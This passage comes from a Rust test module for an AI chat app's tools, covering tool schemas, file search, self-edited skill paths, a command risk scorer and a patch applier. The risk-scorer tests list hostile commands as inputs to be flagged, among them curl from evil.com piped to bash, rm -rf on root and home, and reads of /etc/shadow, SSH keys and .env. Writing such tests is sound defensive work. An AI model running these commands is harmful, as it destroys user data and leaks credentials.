    use uuid::Uuid;

    fn make_temp_dir(label: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("ai-chat-tools-{label}-{}", Uuid::new_v4()));
        fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// The `consolidate` action is only advertised while self-evolution mode is
    /// on: with the mode off the `evolution` scope does not exist, so a
    /// consolidation call would be unanswerable.
    #[test]
    fn memory_schema_advertises_consolidate_only_in_self_evolution_mode() {
        let memory_tool = |self_evolution: bool| {
            super::get_all_tools(&["memory".to_string()], self_evolution, false)
                .into_iter()
                .find(|tool| tool["function"]["name"] == "memory")
                .expect("memory tool must be advertised")
        };

        let actions = |tool: &serde_json::Value| -> Vec<String> {
            tool["function"]["parameters"]["properties"]["action"]["enum"]
                .as_array()
                .unwrap()
                .iter()
                .map(|value| value.as_str().unwrap().to_string())
                .collect()
        };

        assert!(actions(&memory_tool(true)).contains(&"consolidate".to_string()));
        assert!(!actions(&memory_tool(false)).contains(&"consolidate".to_string()));
    }

    /// The OS label is injected through the `run_shell` schema and the script
    /// language is fixed by the build — the model is never asked to pick an
    /// interpreter per call.
    #[test]
    fn run_shell_schema_carries_the_machine_and_fixes_the_shell() {
        let tools = super::get_all_tools(&["run_shell".to_string()], false, false);
        let run_shell = tools
            .iter()
            .find(|tool| tool["function"]["name"] == "run_shell")
            .expect("run_shell advertised");
        let machine = super::machine_label();

        let description = run_shell["function"]["description"]
            .as_str()
            .expect("description is a string");
        assert!(description.contains(machine), "{description}");
        assert!(
            description.contains(super::RUN_SHELL_LANGUAGE),
            "{description}"
        );
        assert!(matches!(super::RUN_SHELL_TYPE, "bash" | "pwsh"));

        let properties = &run_shell["function"]["parameters"]["properties"];
        assert!(
            properties["type"].is_null(),
            "the shell type must not be a model-facing argument"
        );
    }

    /// `mcp_self` is the mode's capability switch: advertised only while
    /// self-evolution mode is on, and never advertised without it (it writes
    /// the app-data MCP registry and starts local processes).
    #[test]
    fn mcp_self_is_advertised_only_in_self_evolution_mode() {
        let advertised = super::get_all_tools(&["file_actions".to_string()], true, false);
        assert!(
            advertised
                .iter()
                .any(|tool| tool["function"]["name"] == "mcp_self"),
            "self-evolution mode must advertise mcp_self"
        );

        let plain = super::get_all_tools(&["file_actions".to_string()], false, false);
        assert!(
            !plain
                .iter()
                .any(|tool| tool["function"]["name"] == "mcp_self"),
            "mcp_self must not be advertised outside self-evolution mode"
        );
    }

    #[test]
    fn background_flag_and_control_tool_are_only_advertised_when_enabled() {
        let tools = super::get_all_tools(
            &["run_cmd".to_string(), "run_shell".to_string()],
            false,
            true,
        );
        assert!(
            tools
                .iter()
                .any(|tool| tool["function"]["name"] == "background_task"),
            "the control tool must be advertised while background execution is on"
        );
        let run_cmd = tools
            .iter()
            .find(|tool| tool["function"]["name"] == "run_cmd")
            .expect("run_cmd advertised");
        assert_eq!(
            run_cmd["function"]["parameters"]["properties"]["run_in_background"]["type"],
            "boolean"
        );

        let disabled = super::get_all_tools(&["run_cmd".to_string()], false, false);
        assert!(
            !disabled
                .iter()
                .any(|tool| tool["function"]["name"] == "background_task"),
            "the control tool must disappear when background execution is off"
        );
        let run_cmd = disabled
            .iter()
            .find(|tool| tool["function"]["name"] == "run_cmd")
            .expect("run_cmd advertised");
        assert!(
            run_cmd["function"]["parameters"]["properties"]["run_in_background"].is_null(),
            "the per-call flag must disappear when background execution is off"
        );
    }

    #[test]
    fn decodes_utf8_bom_output() {
        let decoded = decode_process_bytes(
            &[0xEF, 0xBB, 0xBF, 0x54, 0x65, 0x73, 0x74],
            OutputDecodeHint::Direct,
        );

        assert_eq!(decoded, "Test");
    }

    #[test]
    fn searches_directory_non_recursively() {
        let root = make_temp_dir("search-non-recursive");
        let dir = root.join("src");
        let nested = dir.join("nested");
        fs::create_dir_all(&dir).unwrap();
        fs::create_dir_all(&nested).unwrap();
        fs::write(dir.join("top.txt"), "Needle in top level\n").unwrap();
        fs::write(nested.join("deep.txt"), "Needle in nested\n").unwrap();

        let output = run_integrated_search(
            "needle",
            &dir,
            &root,
            &SearchOptions {
                recursive: false,
                ..SearchOptions::default()
            },
        )
        .unwrap();

        assert!(output.contains("src/top.txt:1:Needle in top level"));
        assert!(!output.contains("deep.txt"));

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn searches_with_regex_recursively() {
        let root = make_temp_dir("search-regex");
        let dir = root.join("src");
        let nested = dir.join("nested");
        fs::create_dir_all(&nested).unwrap();
        fs::write(nested.join("deep.txt"), "prefix Alpha42 suffix\n").unwrap();

        let output = run_integrated_search(
            "alpha\\d+",
            &dir,
            &root,
            &SearchOptions {
                use_regex: true,
                ..SearchOptions::default()
            },
        )
        .unwrap();

        assert!(output.contains("src/nested/deep.txt:1:prefix Alpha42 suffix"));

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn smart_case_upgrades_to_case_sensitive_search() {
        let root = make_temp_dir("search-smart-case");
        let file = root.join("sample.txt");
        fs::write(&file, "needle\nNeedle\n").unwrap();

        let output = run_integrated_search(
            "Needle",
            &file,
            &root,
            &SearchOptions {
                smart_case: true,
                ..SearchOptions::default()
            },
        )
        .unwrap();

        assert!(!output.contains("sample.txt:1:needle"));
        assert!(output.contains("sample.txt:2:Needle"));

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn search_glob_and_filters_limit_directory_results() {
        let root = make_temp_dir("search-filters");
        let dir = root.join("src");
        let git_dir = root.join(".git");
        fs::create_dir_all(&dir).unwrap();
        fs::create_dir_all(&git_dir).unwrap();
        fs::write(root.join(".gitignore"), "src/ignored.md\n").unwrap();
        fs::write(dir.join("keep.md"), "needle keep\n").unwrap();
        fs::write(dir.join("keep.txt"), "needle text\n").unwrap();
        fs::write(dir.join("ignored.md"), "needle ignored\n").unwrap();
        fs::write(dir.join(".hidden.md"), "needle hidden\n").unwrap();

        let output = run_integrated_search(
            "needle",
            &dir,
            &root,
            &SearchOptions {
                include_hidden: false,
                respect_gitignore: true,
                glob: Some("**/*.md".to_string()),
                ..SearchOptions::default()
            },
        )
        .unwrap();

        assert!(output.contains("src/keep.md:1:needle keep"));
        assert!(!output.contains("keep.txt"));
        assert!(!output.contains("ignored.md"));
        assert!(!output.contains(".hidden.md"));

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn search_caps_matches_and_reports_the_truncation() {
        let root = make_temp_dir("search-match-cap");
        let dir = root.join("many");
        fs::create_dir_all(&dir).unwrap();
        for index in 0..40 {
            fs::write(
                dir.join(format!("file-{index:02}.txt")),
                "needle one\nneedle two\n",
            )
            .unwrap();
        }

        let output = run_integrated_search(
            "needle",
            &dir,
            &root,
            &SearchOptions {
                max_matches: 10,
                ..SearchOptions::default()
            },
        )
        .unwrap();

        // 10 rows, no more, and a footer the model can act on.
        let hits = output
            .lines()
            .filter(|line| line.contains(":needle"))
            .count();
        assert_eq!(hits, 10);
        assert!(output.contains("[search]"));
        assert!(output.contains("10-match limit"));
        assert!(output.contains("max_results"));

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn search_skips_oversized_and_binary_files() {
        let root = make_temp_dir("search-skip");
        let dir = root.join("mixed");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("small.txt"), "needle here\n").unwrap();
        fs::write(dir.join("blob.bin"), [0u8, 1, 2, 0, 3]).unwrap();
        // Sparse-ish oversized file: 3 MiB of a repeated needle line.
        let big_line = format!("needle {}\n", "x".repeat(64));
        fs::write(
            dir.join("big.txt"),
            big_line.repeat((SEARCH_MAX_FILE_BYTES as usize / big_line.len()) + 8),
        )
        .unwrap();

        let output =
            run_integrated_search("needle", &dir, &root, &SearchOptions::default()).unwrap();

        assert!(output.contains("small.txt:1:needle here"));
        assert!(!output.contains("big.txt"));
        assert!(!output.contains("blob.bin"));
        assert!(output.contains("1 file(s) over 2 MiB skipped"));
        assert!(output.contains("1 binary file(s) skipped"));

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn case_insensitive_literal_search_avoids_regressions() {
        assert!(contains_ignore_case("Hello World", "hello"));
        assert!(contains_ignore_case("HELLO", "hello"));
        assert!(!contains_ignore_case("Hell", "hello"));
        assert!(contains_ignore_case("aXaXa", ""));
        // Non-ASCII still falls back to the Unicode-aware path.
        assert!(contains_ignore_case("ÄÖÜ straße", "straße"));
        assert!(!contains_ignore_case("ÄÖÜ", "abc"));
    }

    #[cfg(windows)]
    #[test]
    fn decodes_gbk_output_with_explicit_code_page() {
        let decoded =
            decode_windows_process_bytes_with_code_pages(&[0x54, 0x65, 0x73, 0x74], &[936])
                .unwrap();

        assert_eq!(decoded, "Test");
    }

    #[test]
    fn integrated_search_reaches_the_workspace_state_directory() {
        let root = make_temp_dir("search-data-reach");
        fs::create_dir_all(root.join(".data").join("memory")).unwrap();
        fs::write(root.join(".data").join("chat.db"), "needle").unwrap();
        fs::write(
            root.join(".data").join("memory").join("note.md"),
            "needle",
        )
        .unwrap();
        fs::write(root.join("notes.md"), "needle").unwrap();

        let output =
            run_integrated_search("needle", &root, &root, &SearchOptions::default()).unwrap();

        assert!(output.contains("notes.md:1:needle"));
        // `.data` is part of the workspace, so the assistant can look up its own
        // skills, memories and todo lists.
        assert!(
            output.contains("note.md"),
            "the workspace state directory must be searchable: {output}"
        );

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn workspace_skill_dir_is_writable_in_self_evolution_mode() {
        let workspace_root = make_temp_dir("writable-skills");
        let writable_root = workspace_root.join(".data").join("skills");
        let skill_file = writable_root.join("demo").join("skill.md");
        fs::create_dir_all(skill_file.parent().unwrap()).unwrap();
        fs::write(&skill_file, "---\nname: demo\ndescription: d\n---\n").unwrap();

        let result = ensure_mutation_target_allowed(
            &skill_file,
            &workspace_root,
            Some(&writable_root),
            "write",
        );

        assert!(result.is_ok());

        let _ = fs::remove_dir_all(&workspace_root);
    }

    #[test]
    fn self_evolution_can_create_new_skill_files_and_folders() {
        let workspace_root = make_temp_dir("new-skill");
        let writable_root = workspace_root.join(".data").join("skills");
        fs::create_dir_all(writable_root.parent().unwrap()).unwrap();

        // Nothing exists yet below `.data/skills` — creating a skill folder
        // and its `skill.md` is exactly what self-evolution has to do.
        let new_skill_dir = writable_root.join("brand-new");
        let new_skill_file = new_skill_dir.join("skill.md");

        for path in [&new_skill_dir, &new_skill_file] {
            assert!(
                ensure_mutation_target_allowed(path, &workspace_root, Some(&writable_root), "write")
                    .is_ok(),
                "expected {} to be writable in self-evolution mode",
                path.display()
            );
        }

        // The workspace state folder is part of the workspace: the memory store,
        // the todo lists and the skill status file are reachable in both modes.
        for path in [
            workspace_root.join(".data").join("skills.status"),
            workspace_root.join(".data").join("memory").join("repo").join("note.md"),
            workspace_root.join(".data").join("todos").join("sess").join("list.json"),
        ] {
            assert!(
                ensure_mutation_target_allowed(&path, &workspace_root, Some(&writable_root), "write")
                    .is_ok(),
                "expected {} to be writable",
                path.display()
            );
            assert!(
                ensure_mutation_target_allowed(&path, &workspace_root, None, "write").is_ok(),
                "expected {} to be writable",
                path.display()
            );
        }

        // The SQLite database is the exception: `file_actions` can only
        // truncate or delete it, never rewrite it.
        for path in [
            workspace_root.join(".data").join("chat.db"),
            workspace_root.join(".data").join("chat.db-wal"),
        ] {
            let err =
                ensure_mutation_target_allowed(&path, &workspace_root, Some(&writable_root), "write")
                    .unwrap_err();
            assert!(
                err.contains("database"),
                "unexpected error for {}: {err}",
                path.display()
            );
        }

        let _ = fs::remove_dir_all(&workspace_root);
    }

    #[test]
    fn self_evolution_cannot_wipe_the_whole_skills_root() {
        let workspace_root = make_temp_dir("skills-root-guard");
        let writable_root = workspace_root.join(".data").join("skills");
        fs::create_dir_all(writable_root.join("demo")).unwrap();

        let err = ensure_mutation_target_allowed(
            &writable_root,
            &workspace_root,
            Some(&writable_root),
            "delete",
        )
        .unwrap_err();
        assert!(
            err.contains("skills root itself"),
            "unexpected error: {err}"
        );

        // `mkdir` on the existing root stays a harmless no-op.
        assert!(ensure_mutation_target_allowed(
            &writable_root,
            &workspace_root,
            Some(&writable_root),
            "mkdir"
        )
        .is_ok());

        let _ = fs::remove_dir_all(&workspace_root);
    }

    /// End-to-end shape of a self-evolution edit: the model asks for
    /// `./.data/skills/<name>/skill.md`, the path is resolved inside the
    /// workspace, the guard lets it through and the skill becomes loadable.
    #[test]
    fn self_evolution_can_install_edit_and_remove_a_skill() {
        let workspace_root = make_temp_dir("self-evolution-e2e");

        // The writable root is exactly the workspace skills directory — and it is
        // the only one: there is no second skills location anywhere.
        let root =
            crate::skills::self_evolution_skill_root(Some(&workspace_root), true)
                .expect("self-evolution exposes one skills root");
        assert_eq!(
            root,
            workspace_root.join(".data").join("skills"),
            "self-evolution must be restricted to .data/skills"
        );

        // Off → nothing is writable.
        assert!(crate::skills::self_evolution_skill_root(Some(&workspace_root), false).is_none());

        // Install: create the skill folder and its document.
        let skill_dir = workspace_root.join(".data").join("skills").join("demo");
        let resolved = super::resolve_safe_path(&workspace_root, "./.data/skills/demo/skill.md")
            .expect("the skill path must resolve inside the workspace");
        assert!(
            ensure_mutation_target_allowed(&resolved, &workspace_root, Some(&root), "write")
                .is_ok()
        );
        fs::create_dir_all(resolved.parent().unwrap()).unwrap();
        fs::write(
            &resolved,
            "---\nname: demo\ndescription: a demo skill\n---\n\nDo the thing.\n",
        )
        .unwrap();

        // The skill resolves like any panel-authored skill.
        let resolved_skill =
            crate::skills::resolve_skill_by_name(&root, "demo").expect("skill loads");
        assert_eq!(resolved_skill.skill.name, "demo");
        assert!(resolved_skill.skill.system_prompt.contains("Do the thing."));

        // Edit: overwrite the document (the tool layer keeps a `.bak.1`).
        let backup = super::file_actions::backup_protected_path(&resolved, Some(&root))
            .unwrap()
            .expect("the edit is backed up");
        assert_eq!(
            backup.file_name().and_then(|n| n.to_str()),
            Some("skill.md.bak.1")
        );
        fs::write(&resolved, "---\nname: demo\ndescription: edited\n---\n\nEdited.\n")
            .unwrap();
        assert!(crate::skills::resolve_skill_by_name(&root, "demo")
            .unwrap()
            .skill
            .system_prompt
            .contains("Edited."));

        // Remove: the folder is copied aside first, then deleted.
        let folder_backup = super::file_actions::backup_protected_path(&skill_dir, Some(&root))
            .unwrap()
            .expect("the folder is backed up");
        fs::remove_dir_all(&skill_dir).unwrap();
        assert!(folder_backup.join("skill.md").is_file());
        assert!(crate::skills::resolve_skill_by_name(&root, "demo").is_err());

        let _ = fs::remove_dir_all(&workspace_root);
    }

    #[test]
    fn resolve_safe_path_rejects_external_absolute_paths() {
        let workspace_root = make_temp_dir("resolve-safe-path");
        let external_root = make_temp_dir("resolve-safe-path-external");
        let external_file = external_root.join("outside.txt");
        fs::write(&external_file, "outside").unwrap();

        let err = super::resolve_safe_path(&workspace_root, &external_file.display().to_string())
            .unwrap_err();

        assert!(err.contains("outside the workspace root"));

        let _ = fs::remove_dir_all(&workspace_root);
        let _ = fs::remove_dir_all(&external_root);
    }

    // ─── Patent Compliance Tests ────────────────────────────────────────────

    #[test]
    fn test_risk_level_l0_to_l6_mapping() {
        use super::{score_to_risk_level, RiskLevel, RISK_THRESHOLDS};

        // Test L0 (85-100)
        assert_eq!(score_to_risk_level(85), RiskLevel::L0);
        assert_eq!(score_to_risk_level(90), RiskLevel::L0);
        assert_eq!(score_to_risk_level(100), RiskLevel::L0);

        // Test L1 (70-84)
        assert_eq!(score_to_risk_level(70), RiskLevel::L1);
        assert_eq!(score_to_risk_level(84), RiskLevel::L1);

        // Test L2 (55-69)
        assert_eq!(score_to_risk_level(55), RiskLevel::L2);
        assert_eq!(score_to_risk_level(69), RiskLevel::L2);

        // Test L3 (40-54)
        assert_eq!(score_to_risk_level(40), RiskLevel::L3);
        assert_eq!(score_to_risk_level(54), RiskLevel::L3);

        // Test L4 (25-39)
        assert_eq!(score_to_risk_level(25), RiskLevel::L4);
        assert_eq!(score_to_risk_level(39), RiskLevel::L4);

        // Test L5 (10-24)
        assert_eq!(score_to_risk_level(10), RiskLevel::L5);
        assert_eq!(score_to_risk_level(24), RiskLevel::L5);

        // Test L6 (0-9)
        assert_eq!(score_to_risk_level(0), RiskLevel::L6);
        assert_eq!(score_to_risk_level(9), RiskLevel::L6);

        // Verify thresholds match patent (10/25/40/55/70/85)
        assert_eq!(RISK_THRESHOLDS, [10, 25, 40, 55, 70, 85]);
    }

    #[test]
    fn test_risk_level_dispositions() {
        use super::RiskLevel;

        // L0/L1: manual review
        assert!(RiskLevel::L0.requires_human_review());
        assert!(RiskLevel::L1.requires_human_review());
        assert!(!RiskLevel::L2.requires_human_review());

        // L2/L3: LLM confirmation
        assert!(RiskLevel::L2.requires_llm_confirmation());
        assert!(RiskLevel::L3.requires_llm_confirmation());
        assert!(!RiskLevel::L1.requires_llm_confirmation());

        // L4-L6: auto-approved
        assert!(RiskLevel::L4.is_auto_approvable());
        assert!(RiskLevel::L5.is_auto_approvable());
        assert!(RiskLevel::L6.is_auto_approvable());
        assert!(!RiskLevel::L3.is_auto_approvable());

        // Disposition strings
        assert!(RiskLevel::L0.disposition().contains("Manual review"));
        assert!(RiskLevel::L1.disposition().contains("Manual review"));
        assert!(RiskLevel::L2.disposition().contains("LLM"));
        assert!(RiskLevel::L3.disposition().contains("LLM"));
        assert!(RiskLevel::L4.disposition().contains("allow"));
        assert!(RiskLevel::L5.disposition().contains("allow"));
        assert!(RiskLevel::L6.disposition().contains("allow"));
    }

    #[test]
    fn test_syntax_gate_unclosed_quotes() {
        use super::syntax_gate_check;

        // Test unclosed single quote
        let result = syntax_gate_check("echo 'hello", "bash");
        assert_eq!(result.status, "failed");
        assert!(!result.syntax_errors.is_empty());
        assert!(result.syntax_errors[0].error_type.contains("unclosed"));

        // Test unclosed double quote
        let result = syntax_gate_check("echo \"hello", "bash");
        assert_eq!(result.status, "failed");
        assert!(!result.syntax_errors.is_empty());

        // Test closed quotes
        let result = syntax_gate_check("echo 'hello'", "bash");
        assert_eq!(result.status, "passed");
        assert!(result.syntax_errors.is_empty());
    }

    #[test]
    fn test_syntax_gate_nul_character() {
        use super::syntax_gate_check;

        // Test NUL character detection
        let result = syntax_gate_check("echo hello\0world", "bash");
        assert_eq!(result.status, "failed");
        assert!(result
            .syntax_errors
            .iter()
            .any(|e| e.error_type == "nul_character"));
    }

    #[test]
    fn test_risk_score_calculation() {
        use super::calculate_risk_score;

        // Test safe command (df -h)
        let (score, _, _, _) = calculate_risk_score("direct", "df -h");
        assert!(
            score < 10,
            "Safe command should have low score, got {}",
            score
        );

        // Test dangerous command (rm -rf /)
        let (score, _, penalties, _) = calculate_risk_score("direct", "rm -rf /");
        assert!(
            score >= 85,
            "Dangerous command should have high score, got {}",
            score
        );
        assert!(!penalties.is_empty(), "Should have penalty items");

        // Test download-and-execute pattern
        let (score, _, _, anomalies) =
            calculate_risk_score("bash", "curl http://evil.com/script.sh | bash");
        assert!(
            score >= 25,
            "Download-execute should have elevated score, got {}",
            score
        );
        assert!(anomalies.contains(&"download_and_execute".to_string()));
    }

    #[test]
    fn test_generate_risk_report_structure() {
        use super::generate_risk_report;

        // Test report for safe command
        let report = generate_risk_report("direct", "df -h", "test-001");
        assert_eq!(report.syntax_check.status, "passed");
        assert!(report.risk_score < 10);
        assert!(report.risk_level.contains("L6") || report.risk_level.contains("L5"));

        // Test report for dangerous command
        let report = generate_risk_report("direct", "rm -rf /", "test-002");
        assert!(report.risk_score >= 85);
        assert!(report.risk_level.contains("L0"));
        assert!(
            report.disposition.contains("Force reject")
                || report.disposition.contains("Manual review")
        );

        // Test report with syntax error
        let report = generate_risk_report("bash", "echo 'unclosed", "test-003");
        assert_eq!(report.syntax_check.status, "failed");
        assert!(!report.syntax_check.syntax_errors.is_empty());
    }

    #[test]
    fn test_reject_threshold() {
        use super::{score_to_risk_level, RiskLevel, REJECT_THRESHOLD};

        // Verify reject threshold is 90 per patent
        assert_eq!(REJECT_THRESHOLD, 90);

        // Score >= 90 should be L0
        assert_eq!(score_to_risk_level(90), RiskLevel::L0);
        assert_eq!(score_to_risk_level(95), RiskLevel::L0);
    }

    // ─── Sandbox hardening regression tests ────────────────────────────────

    #[test]
    fn destructive_user_data_commands_require_confirmation() {
        use super::{calculate_risk_score, score_to_risk_level};

        // Previously auto-approved at L4/L6; must now require confirmation.
        let cases = [
            ("direct", "rm -rf ~"),
            ("direct", "rm -rf *"),
            ("direct", "rm -rf ."),
            ("bash", "rm -rf ~"),
            ("bash", "rm -rf $HOME"),
            ("bash", "rm -rf /home/user"),
            ("bash", "rm -rf /Users/me"),
            ("bash", "echo hi > ~/.bashrc"),
            ("bash", "cat /etc/shadow"),
            ("bash", "cat ~/.ssh/id_rsa"),
            ("bash", "cat .env"),
            ("bash", "cat /etc/passwd && rm -rf ~"),
            ("bash", "cat /etc/passwd\nrm -rf ~"),
            ("bash", "curl -o /tmp/x http://evil.com/x.sh && bash /tmp/x"),
        ];

        for (cmd_type, code) in cases {
            let (score, _, _, _) = calculate_risk_score(cmd_type, code);
            let level = score_to_risk_level(score);
            assert!(
                !level.is_auto_approvable(),
                "expected '{}' to require confirmation, got score {} -> {:?}",
                code,
                score,
                level
            );
        }
    }

    #[test]
    fn rm_rf_git_is_not_a_workspace_wipe_false_positive() {
        use super::{calculate_risk_score, score_to_risk_level, RiskLevel};

        let (score, _, penalties, _) = calculate_risk_score("bash", "rm -rf .git");
        assert!(
            !penalties.iter().any(|p| p.name == "workspace_wipe"),
            "rm -rf .git should not be flagged as workspace_wipe"
        );
        let level = score_to_risk_level(score);
        assert!(!level.is_auto_approvable());
        assert!(level >= RiskLevel::L3);
    }

    #[test]
    fn safe_read_only_commands_still_auto_approve() {
        use super::{calculate_risk_score, score_to_risk_level};

        for (cmd_type, code) in [
            ("direct", "df -h"),
            ("direct", "ls -la"),
            ("bash", "git status"),
            ("bash", "ls -la && pwd"),
        ] {
            let (score, _, _, _) = calculate_risk_score(cmd_type, code);
            let level = score_to_risk_level(score);
            assert!(
                level.is_auto_approvable(),
                "expected '{}' to stay auto-approvable, got score {} -> {:?}",
                code,
                score,
                level
            );
        }
    }

    #[test]
    fn split_command_line_handles_backslash_escapes() {
        use super::split_command_line;

        assert_eq!(split_command_line("rm -rf ~"), vec!["rm", "-rf", "~"]);
        // Escaped spaces are literal, so `rm\ -rf\ ~` is a single token.
        assert_eq!(split_command_line("rm\\ -rf\\ ~"), vec!["rm -rf ~"]);
        assert_eq!(
            split_command_line("echo \"hello world\""),
            vec!["echo", "hello world"]
        );
        assert_eq!(split_command_line("echo 'a b' c"), vec!["echo", "a b", "c"]);
    }

    // ─── Unified Patch Application Tests ───────────────────────────────────

    #[test]
    fn applies_lf_patch_to_lf_file() {
        use super::apply_unified_patch;

        let original = "line1\nline2\nline3\n";
        let patch = "\
--- a/file
+++ b/file
@@ -1,3 +1,3 @@
 line1
-line2
+line2 changed
 line3
";
        let (result, _notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "line1\nline2 changed\nline3\n");
    }

    #[test]
    fn applies_lf_patch_to_crlf_file() {
        use super::apply_unified_patch;

        // CRLF file + LF patch (the common LLM-generated case) must apply and
        // preserve CRLF line endings.
        let original = "line1\r\nline2\r\nline3\r\n";
        let patch = "\
--- a/file
+++ b/file
@@ -1,3 +1,3 @@
 line1
-line2
+line2 changed
 line3
";
        let (result, _notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "line1\r\nline2 changed\r\nline3\r\n");
    }

    #[test]
    fn applies_crlf_patch_to_crlf_file() {
        use super::apply_unified_patch;

        let original = "line1\r\nline2\r\nline3\r\n";
        let patch = "\
--- a/file
+++ b/file
@@ -1,3 +1,3 @@
 line1
-line2
+line2 changed
 line3
"
        .replace('\n', "\r\n");
        let (result, _notes) = apply_unified_patch(original, &patch).unwrap();
        assert_eq!(result, "line1\r\nline2 changed\r\nline3\r\n");
    }

    #[test]
    fn applies_patch_to_file_without_trailing_newline() {
        use super::apply_unified_patch;

        // File without a trailing newline + patch touching the last line.
        let original = "line1\nline2\nline3";
        let patch = "\
--- a/file
+++ b/file
@@ -1,3 +1,3 @@
 line1
-line2
+line2 changed
 line3
";
        let (result, _notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "line1\nline2 changed\nline3");
    }

    #[test]
    fn applies_patch_appending_line_to_file_without_trailing_newline() {
        use super::apply_unified_patch;

        // Patch appends a new line at EOF; the appended line keeps its newline.
        let original = "line1\nline2";
        let patch = "\
--- a/file
+++ b/file
@@ -1,2 +1,3 @@
 line1
 line2
+line3
";
        let (result, _notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "line1\nline2\nline3\n");
    }

    #[test]
    fn rejects_patch_with_mismatched_context() {
        use super::apply_unified_patch;

        let original = "line1\nline2\nline3\n";
        let patch = "\
--- a/file
+++ b/file
@@ -1,3 +1,3 @@
 line1
-lineX
+line2 changed
 line3
";
        assert!(apply_unified_patch(original, patch).is_err());
    }

    // ─── LLM-hardening regression tests for `patch` ────────────────────────

    #[test]
    fn patch_applies_when_line_numbers_are_wrong() {
        use super::apply_unified_patch;

        let original = "l1\nl2\nl3\nl4\nl5\nl6\nl7\nl8\n";
        // The header claims line 1 (a common LLM default) but the content
        // lives at line 5; the applier must find it by content.
        let patch = "\
@@ -1,3 +1,3 @@
 l5
-l6
+L6
 l7
";
        let (result, notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "l1\nl2\nl3\nl4\nl5\nL6\nl7\nl8\n");
        assert!(
            notes.iter().any(|note| note.contains("located at line 5")),
            "notes should report the content search: {notes:?}"
        );
    }

    #[test]
    fn patch_ignores_wrong_hunk_counts() {
        use super::apply_unified_patch;

        // Counts are nonsense (99 vs 4 body lines). The old applier rejected
        // this with "Hunk header does not match hunk".
        let original = "a\nb\nc\n";
        let patch = "@@ -1,99 +1,99 @@\n a\n-b\n+B\n c\n";
        let (result, _notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "a\nB\nc\n");
    }

    #[test]
    fn patch_applies_hunks_written_out_of_order() {
        use super::apply_unified_patch;

        let original = "alpha\nbeta\ngamma\ndelta\nepsilon\n";
        // The later hunk is written first; edits are spliced by position.
        let patch = "\
@@ -4,2 +4,2 @@
 delta
-epsilon
+EPSILON
@@ -1,3 +1,3 @@
 alpha
-beta
+BETA
 gamma
";
        let (result, _notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "alpha\nBETA\ngamma\ndelta\nEPSILON\n");
    }

    #[test]
    fn patch_tolerates_indentation_and_trailing_whitespace() {
        use super::apply_unified_patch;

        let original = "fn main() {\n\tlet value = 1;   \n\tlet other = 2;\n}\n";
        let patch = "\
@@ -1,4 +1,4 @@
 fn main() {
-    let value = 1;
+    let value = 10;
     let other = 2;
 }
";
        let (result, notes) = apply_unified_patch(original, patch).unwrap();
        // The changed line comes from the patch; untouched context keeps the
        // file's own bytes (tab indentation, trailing spaces).
        assert_eq!(
            result,
            "fn main() {\n    let value = 10;\n\tlet other = 2;\n}\n"
        );
        assert!(
            notes.iter().any(|note| note.contains("whitespace")),
            "notes should mention the whitespace tolerance: {notes:?}"
        );
    }

    #[test]
    fn patch_accepts_code_fences_and_context_without_leading_space() {
        use super::apply_unified_patch;

        let original = "one\ntwo\nthree\n";
        let patch = "\
```diff
--- a/file
+++ b/file
@@ -1,3 +1,3 @@
one
-two
+TWO
three
```
";
        let (result, _notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "one\nTWO\nthree\n");
    }

    #[test]
    fn patch_tolerates_blank_line_between_hunks() {
        use super::apply_unified_patch;

        let original = "a\nb\nc\nd\ne\n";
        let patch = "@@ -1,2 +1,2 @@\n a\n-b\n+B\n\n@@ -4,2 +4,2 @@\n d\n-e\n+E\n";
        let (result, _notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "a\nB\nc\nd\nE\n");
    }

    #[test]
    fn patch_duplicate_context_uses_nearest_line_number() {
        use super::apply_unified_patch;

        let original = "same\nold\nfirst\nsame\nold\nsecond\n";
        // Two identical blocks; the header points at the second one.
        let patch = "@@ -6,2 +6,2 @@\n same\n-old\n+new\n";
        let (result, notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "same\nold\nfirst\nsame\nnew\nsecond\n");
        assert!(
            notes.iter().any(|note| note.contains("places matched")),
            "notes should mention the ambiguity: {notes:?}"
        );
    }

    #[test]
    fn patch_ambiguous_without_line_numbers_is_rejected() {
        use super::apply_unified_patch;

        let original = "same\nold\nsame\nold\n";
        let patch = "\
--- a/file
+++ b/file
 same
-old
+new
";
        let err = apply_unified_patch(original, patch).unwrap_err();
        assert!(err.contains("different places"), "unexpected error: {err}");
    }

    #[test]
    fn patch_reports_actual_content_when_context_differs() {
        use super::apply_unified_patch;

        let original = "one\ntwo\nthree\n";
        let patch = "@@ -1,2 +1,2 @@\n one\n-two typo\n+TWO\n";
        let err = apply_unified_patch(original, patch).unwrap_err();
        assert!(err.contains("does not match"), "unexpected error: {err}");
        assert!(
            err.contains("Closest current content"),
            "unexpected error: {err}"
        );
        assert!(
            err.contains("two"),
            "the error should show the real file content: {err}"
        );
    }

    #[test]
    fn patch_detects_already_applied_change() {
        use super::apply_unified_patch;

        let original = "one\nTWO\nthree\n";
        let patch = "@@ -1,3 +1,3 @@\n one\n-two\n+TWO\n three\n";
        let err = apply_unified_patch(original, patch).unwrap_err();
        assert!(
            err.contains("already be applied"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn patch_pure_insertion_uses_header_position() {
        use super::apply_unified_patch;

        let original = "a\nb\n";
        // `-1,0` marks an insertion point after line 1 (0 = before line 1).
        let patch = "@@ -1,0 +2,1 @@\n+inserted\n";
        let (result, _notes) = apply_unified_patch(original, patch).unwrap();
        assert_eq!(result, "a\ninserted\nb\n");
    }

    #[test]
